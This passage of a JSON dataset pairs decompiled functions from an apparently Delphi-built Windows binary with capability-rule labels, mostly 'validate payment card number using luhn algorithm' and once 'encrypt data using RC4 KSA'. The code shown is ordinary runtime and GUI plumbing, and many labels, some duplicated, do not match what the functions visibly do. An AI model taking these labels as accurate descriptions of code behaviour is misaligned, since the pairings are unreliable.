        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004757ec(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_10h;\n    int32_t rgIndices;\n    uint uVar4;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    var_1ch = 0;\n    uStack52 = 0x4758e9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x475820;\n    iVar1 = fcn.00404bcc();\n    if (iVar1 != 0) {\n        puStack60 = 0x475834;\n        var_4h = fcn.004037f0();\n        uStack64 = 0x4758bc;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.00477598();\n        var_ch = 0;\n        var_8h = *(var_4h + 8) + -1;\n        uVar4 = param_1;\n        fcn.00415c9c(param_1);\n        iVar1 = *(var_4h + 8);\n        if (-1 < iVar1 + -1) {\n            iVar3 = 0;\n            do {\n                arg_10h = 1;\n                rgIndices = iVar3;\n                piVar2 = fcn.0041c4c8();\n                (**(*piVar2 + 100))();\n                fcn.00415f98(param_1, &fcn.004757ec::var_1ch, arg_10h, rgIndices);\n                iVar3 = iVar3 + 1;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        *in_FS_OFFSET = uVar4;\n        uStack64 = 0x4758d3;\n        uStack68 = 0x4758bb;\n        fcn.00403820();\n        return;\n    }\n    puStack60 = 0x4758cc;\n    piVar2 = fcn.00475904();\n    puStack60 = 0x4758d3;\n    (**(*piVar2 + 100))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x4758f0;\n    uStack52 = 0x4758e8;\n    fcn.004104d4();\n    return;\n}\n",
        "token_count": 702
    },
    "00475904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00475904(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x47596d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar2 = 0x47592d;\n    iVar1 = fcn.0047598c();\n    if (iVar1 == 0) {\n        fcn.0040675c();\n        fcn.0046bc4c(in_EAX);\n        uVar2 = in_EAX;\n    }\n    *in_FS_OFFSET = uVar2;\n    uStack36 = 0x475974;\n    uStack40 = 0x47596c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 235
    },
    "004759f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004759f8(uint arg_8h)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uchar in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if ((*(in_ECX + 0x42) != '\\0') && (*(in_ECX + 0x42) != '\\x03')) {\n        puStack24 = 0x475a67;\n        fcn.004177f4();\n        return;\n    }\n    uVar1 = *(in_EAX + 0x9d);\n    *(in_EAX + 0x9d) = in_DL;\n    uStack28 = 0x475a59;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_ECX + 100))();\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x9d) = uVar1;\n    return;\n}\n",
        "token_count": 260
    },
    "00475ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __fastcall fcn.00475ae0(uint param_1, double *param_2)\n\n{\n    double dVar1;\n    char in_AL;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    int64_t iVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_8h;\n    \n    dVar1 = *param_2;\n    if ((in_AL != '\\t') && (in_AL != '\\n')) {\n        uStack48 = 0x475b40;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        iVar3 = ROUND(dVar1);\n        puStack44 = &stack0xfffffffc;\n        fcn.0040a6cc(iVar3, iVar3 >> 0x20);\n        *in_FS_OFFSET = iVar3;\n    }\n    uStack52 = 0x475b5c;\n    fVar2 = fcn.0040a690();\n    return fVar2;\n}\n",
        "token_count": 244
    },
    "00475b6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475b6c(uint arg_8h, uint arg_ch)\n\n{\n    char in_AL;\n    double *in_EDX;\n    float10 fVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040a60c(arg_8h, arg_ch);\n    if (in_AL == '\\t') {\n        *in_EDX = var_4h;\n    }\n    else if (in_AL == '\\n') {\n        *in_EDX = var_8h;\n    }\n    else {\n        fVar1 = fcn.0040a6ec();\n        *in_EDX = fVar1;\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00475bb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00475bb4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY72;\n    uint uStackY68;\n    uchar *puStackY64;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    uStack52 = 0x475c62;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStackY64 = 0x475bff;\n    fcn.00415c9c(&fcn.00475bb4::var_18h);\n    puStackY64 = 0x475c0a;\n    fcn.00414ccc();\n    puStackY64 = 0x475c12;\n    var_8h = fcn.00415de4();\n    uStackY68 = 0x475c45;\n    uStackY72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStackY64 = &stack0xfffffffc;\n    fcn.00402d34();\n    *in_FS_OFFSET = uStackY72;\n    puStackY64 = 0x475c4c;\n    uStackY68 = 0x475c44;\n    fcn.00415e04();\n    return;\n}\n",
        "token_count": 387
    },
    "00475c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475c70(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint16_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x475c8c;\n    iVar1 = fcn.00415dc0();\n    *in_ECX = iVar1 + 1;\n    puStack24 = 0x475c98;\n    fcn.00415de4();\n    uStack28 = 0x475cfc;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00402d34();\n    iVar2 = (**(**(arg_8h + -4) + 0x70))();\n    if (*in_ECX < iVar2) {\n        (**(**(arg_8h + -4) + 0x70))();\n        fcn.004031a8();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x475d03;\n    uStack28 = 0x475cfb;\n    fcn.00415e04();\n    return;\n}\n",
        "token_count": 307
    },
    "004762d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004762d4(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x476332;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puVar1 = &stack0xfffffffc;\n    if (2 < *(in_EAX + 0x9d) - 2U) {\n        fcn.0040675c();\n        fcn.0046bba0();\n        puVar1 = puStack20;\n    }\n    puStack20 = puVar1;\n    (**(*in_EAX + 0xac))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x476339;\n    uStack24 = 0x476331;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 236
    },
    "00477598": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00477598(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x47760d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    while( true ) {\n        iVar1 = fcn.00404888();\n        if (iVar1 < 1) break;\n        fcn.0046bca8();\n        fcn.00475904();\n        if (param_2 != 0) {\n            fcn.0041c358();\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x477614;\n    uStack36 = 0x47760c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 238
    },
    "00477c24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00477c24(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x477c85;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x485c1c == 0;\n    *0x485c1c = *0x485c1c + -1;\n    if (bVar1) {\n        fcn.004037f0();\n        fcn.004062dc();\n        fcn.004062dc();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 174
    },
    "004786f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004786f0(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = 0x47870d;\n    piVar1 = fcn.00455920();\n    uStack24 = 0x478753;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &fcn.004786f0::var_1h + 1;\n    fcn.004062b0();\n    iVar2 = (**(*piVar1 + 0xec))();\n    var_1h._0_1_ = iVar2 == 1;\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x47875a;\n    uStack24 = 0x478752;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 260
    },
    "004797bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004797bc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4797d5;\n    fcn.0040630c();\n    uStack24 = 0x479816;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.004796cc();\n    (**(_pe_dos_header + 0x10))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x47981d;\n    uStack24 = 0x47980d;\n    fcn.00406298();\n    uStack24 = 0x479815;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 206
    },
    "00479874": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00479874(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    fcn.004799b4();\n    fcn.004062b0();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 148
    },
    "004799b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004799b4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    *(in_EAX + 0xc) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "00479a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00479a44(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00479874();\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 168
    },
    "00479fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00479fb8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00479874();\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 168
    },
    "00479ff4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00479ff4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x18) = 1;\n    puStack16 = 0x47a010;\n    var_4h = in_EAX;\n    var_8h = fcn.004285f4();\n    uStack20 = 0x47a062;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.004062dc();\n    fcn.00428f7c();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x47a069;\n    *(var_4h + 0x18) = 0;\n    uStack20 = 0x47a061;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 240
    },
    "0047a438": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047a438(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    iVar1 = in_EAX[1];\n    *param_2 = (*(**0x484828 + 0x40) * *in_EAX) / 0x9ec;\n    param_2[1] = (*(**0x484828 + 0x40) * iVar1) / 0x9ec;\n    return;\n}\n",
        "token_count": 118
    },
    "0047b370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047b370(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.004038d4();\n    if (cVar1 == '\\0') {\n        cVar1 = sub.ole32.dll_IsEqualGUID(arg_ch, *(*(arg_8h + 4) + 0x208) + 0x10);\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            fcn.004038d4();\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "0047d970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047d970(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0047c08c();\n    if (iVar1 != 0) {\n        fcn.004515e8(5, arg_10h, 2);\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "0047d7d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047d7d8(int32_t arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = 0;\n    }\n    fcn.004062b0();\n    fcn.00406298();\n    fcn.0043d1e8();\n    *arg_14h = var_10h;\n    arg_14h[1] = uStack16;\n    arg_14h[2] = uStack12;\n    arg_14h[3] = uStack8;\n    sub.user32.dll_SetRect(arg_18h, 0, 0, 0x7fff, 0x7fff);\n    *(arg_1ch + 4) = 0;\n    uVar1 = fcn.00443e90();\n    *(arg_1ch + 8) = uVar1;\n    *(arg_1ch + 0xc) = 0;\n    *(arg_1ch + 0x10) = 0;\n    return 0;\n}\n",
        "token_count": 317
    },
    "0047d8e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047d8e4(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_10h;\n    \n    fcn.0041b080(&var_10h, 0x7fff);\n    (**(**(arg_8h + 0x22c) + 0x1c))(*(arg_8h + 0x22c), arg_ch, &var_10h);\n    return 0;\n}\n",
        "token_count": 103
    },
    "0047b34c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047b34c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0047ba94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047ba94(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    if (in_EAX == -0x7ffbfeee) {\n        fcn.00403770();\n        var_8h = &var_108h;\n        var_4h._0_1_ = 4;\n        fcn.0040c918(0, &var_8h);\n        fcn.00403fc0();\n    }\n    fcn.00465b2c();\n    return;\n}\n",
        "token_count": 151
    },
    "0047bc34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047bc34(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47bcf6;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0x47bc5b;\n    fcn.0047bfac();\n    uStack40 = 0;\n    uStack44 = 2;\n    puStack48 = 0x47bc64;\n    iVar1 = sub.kernel32.dll_GlobalAlloc();\n    *(in_EAX + 0x214) = iVar1;\n    if (iVar1 == 0) {\n        puStack48 = 0x47bc78;\n        fcn.0040c8d0();\n    }\n    uStack52 = 0x47bcc9;\n    piStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    uVar2 = fcn.00406298();\n    piVar4 = *(in_EAX + 0x214);\n    sub.ole32.dll_CreateStreamOnHGlobal(piVar4, 0, uVar2);\n    fcn.00465b2c();\n    piVar3 = *(in_EAX + 0x21c);\n    (**(*piVar3 + 0x18))(piVar3, 0, 0xffffffff);\n    fcn.00465b2c();\n    *in_FS_OFFSET = piVar3;\n    *in_FS_OFFSET = piVar4;\n    fcn.00406298(0x47bcfd);\n    return;\n}\n",
        "token_count": 480
    },
    "0047c078": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0047c078(void)\n\n{\n    uint uStack8;\n    \n    fcn.0047c110();\n    return uStack8;\n}\n",
        "token_count": 35
    },
    "0047c0dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.0047c0dc(void)\n\n{\n    ushort uStack8;\n    \n    fcn.0047c110();\n    return uStack8;\n}\n",
        "token_count": 36
    },
    "0047c110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047c110(ushort *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar2;\n    int32_t *piStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    \n    puStack52 = 0x47c12d;\n    fcn.00404f64();\n    uStack56 = 0x47c192;\n    piStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.0047b7a4();\n    *param_1 = 0;\n    piVar2 = *(in_EAX + 0x224);\n    iVar1 = (**(*piVar2 + 0x18))(piVar2, param_2, *0x484328, 0, 2, 0x48420c, param_1, &fcn.0047c110::var_20h, 0);\n    if (iVar1 != 0) {\n        fcn.00466770();\n    }\n    *in_FS_OFFSET = piVar2;\n    fcn.00405034(0x47c199);\n    return;\n}\n",
        "token_count": 300
    },
    "0047c668": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047c668(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x47c67e;\n    fcn.0047bfac();\n    uStack32 = 0x47c70e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0x47c692;\n    puStack28 = &stack0xfffffffc;\n    uStack40 = (***param_2)();\n    uStack44 = 2;\n    uStack48 = 0x47c69a;\n    iVar1 = sub.kernel32.dll_GlobalAlloc();\n    *(in_EAX + 0x214) = iVar1;\n    if (iVar1 == 0) {\n        uStack48 = 0x47c6ae;\n        fcn.0040c8d0();\n    }\n    uStack48 = *(in_EAX + 0x214);\n    puStack52 = 0x47c6bd;\n    sub.kernel32.dll_GlobalLock();\n    uStack56 = 0x47c6fd;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    (***param_2)();\n    (**(*param_2 + 0xc))();\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x47c704;\n    uStack56 = *(in_EAX + 0x214);\n    uStack60 = 0x47c6fc;\n    sub.kernel32.dll_GlobalUnlock();\n    return;\n}\n",
        "token_count": 456
    },
    "0047c728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047c728(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((arg_ch != *(in_EAX + 0x48)) && (0 < *(in_EAX + 0x48))) ||\n       ((*(in_EAX + 0x4c) != arg_8h && (0 < *(in_EAX + 0x4c))))) {\n        if ((*(in_EAX + 0x23d) & 4) == 0) {\n            uVar1 = sub.kernel32.dll_MulDiv(arg_8h, 0x9ec, *(**0x484828 + 0x40));\n            sub.kernel32.dll_MulDiv(arg_ch, 0x9ec, *(**0x484828 + 0x40), uVar1);\n            fcn.0041b058();\n            iVar2 = (**(**(in_EAX + 0x218) + 0x44))(*(in_EAX + 0x218), 1, &var_10h);\n            if (iVar2 == 0) goto code_r0x0047c7b3;\n        }\n        arg_ch = *(in_EAX + 0x48);\n        arg_8h = *(in_EAX + 0x4c);\n    }\ncode_r0x0047c7b3:\n    fcn.00443a30(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 363
    },
    "0047c7d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047c7d8(void)\n\n{\n    fcn.0047cac0(9);\n    return;\n}\n",
        "token_count": 29
    },
    "0047c7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047c7f0(void)\n\n{\n    fcn.0047cac0(3);\n    return;\n}\n",
        "token_count": 29
    },
    "0047c8bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047c8bc(void)\n\n{\n    fcn.0047cac0(0xb);\n    return;\n}\n",
        "token_count": 29
    },
    "0047cb78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047cb78(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint bstrString;\n    \n    puStack36 = 0x47cb94;\n    uVar1 = fcn.004053f4();\n    uStack40 = 0x47cbc8;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0047cac0();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x47cbcf;\n    uStack44 = 0x47cbc7;\n    uStack40 = uVar1;\n    sub.oleaut32.dll_SysFreeString_1();\n    return;\n}\n",
        "token_count": 199
    },
    "0047e250": {
        "rules": [
